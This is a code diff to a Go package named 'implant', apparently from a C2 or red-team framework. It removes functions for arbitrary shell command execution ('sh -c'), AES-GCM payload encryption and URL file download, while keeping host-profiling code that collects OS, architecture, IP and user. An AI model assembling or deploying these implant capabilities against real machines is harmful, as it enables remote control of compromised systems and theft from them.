@@ -1,17 +1,10 @@
 package implant
-//nolint:staticcheck
 
 import (
-	"crypto/aes"
-	"crypto/cipher"
 	"crypto/rand"
 	"encoding/base64"
-	"fmt"
-	"io"
 	"math/big"
-	"net/http"
 	"os"
-	"os/exec"
 	"runtime"
 	"time"
 )
@@ -65,14 +58,6 @@ func (i *Implant) checkIn() {
 		"arch":        runtime.GOARCH,
 	}
 	_ = data
-}  //nolint:staticcheck
-  //nolint:staticcheck
-func (i *Implant) executeCommand(cmd string) (string, error) {  //nolint:unused
-	out, err := exec.Command("sh", "-c", cmd).Output()
-	if err != nil {
-		return "", err
-	}
-	return string(out), nil
 }
 
 func (i *Implant) Stop() {
@@ -96,54 +81,4 @@ func (i *Implant) getInternalIP() string {
 
 func (i *Implant) getCurrentUser() string {
 	return os.Getenv("USER")
-}  //nolint:staticcheck
-  //nolint:staticcheck
-func (i *Implant) encrypt(data []byte, key []byte) ([]byte, error) {  //nolint:unused
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return nil, err
-	}
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil, err
-	}
-	nonce := make([]byte, gcm.NonceSize())
-	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
-		return nil, err
-	}
-	return gcm.Seal(nonce, nonce, data, nil), nil
-}  //nolint:staticcheck
-  //nolint:staticcheck
-func (i *Implant) decrypt(data []byte, key []byte) ([]byte, error) {  //nolint:unused
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return nil, err
-	}
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil, err
-	}
-	nonceSize := gcm.NonceSize()
-	if len(data) < nonceSize {
-		return nil, fmt.Errorf("ciphertext too short")
-	}
-	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
-	return gcm.Open(nil, nonce, ciphertext, nil)
-}  //nolint:staticcheck
-  //nolint:staticcheck
-func (i *Implant) downloadFile(url string, dest string) error {  //nolint:unused
-	resp, err := http.Get(url)
-	if err != nil {
-		return err
-	}
-	defer func() { _ = resp.Body.Close() }()
-
-	out, err := os.Create(dest)
-	if err != nil {
-		return err
-	}
-	defer func() { _ = out.Close() }()
-
-	_, err = io.Copy(out, resp.Body)
-	return err
 }
